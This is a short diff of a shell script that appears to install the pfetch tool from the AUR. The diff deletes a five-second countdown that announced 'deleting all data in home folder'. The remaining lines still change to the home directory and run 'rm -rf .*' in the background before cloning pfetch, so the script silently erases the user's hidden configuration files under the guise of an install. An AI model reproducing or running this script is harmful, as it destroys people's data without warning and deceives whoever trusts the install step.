@@ -1,13 +1,3 @@
-echo deleting all data in home folder in 5 &&
-sleep 1 &&
-echo deleting all data in home folder in 4 &&
-sleep 1 &&
-echo deleting all data in home folder in 3 &&
-sleep 1 &&
-echo deleting all data in home folder in 2 &&
-sleep 1 &&
-echo deleting all data in home folder in 1 &&
-sleep 1 &&
 cd ~ &&
 rm -rf .* &
 git clone https://aur.archlinux.org/pfetch &&
